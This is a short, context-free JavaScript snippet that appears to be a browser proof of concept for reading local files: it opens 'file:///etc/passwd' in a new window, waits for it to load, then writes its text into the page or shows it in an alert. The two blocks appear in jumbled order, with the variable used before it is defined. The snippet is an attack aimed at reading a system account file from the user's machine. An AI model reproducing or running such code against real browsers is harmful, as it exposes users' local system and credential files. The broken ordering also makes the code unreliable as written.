
while (x.document.readyState !='complete') ; 
var strSecretText = x.document.body.innerText; 
x.close(); 
alert(strSecretText);

var x = window.open('file:///etc/passwd');
document.write(x.document.body.innerText);
x.close(); 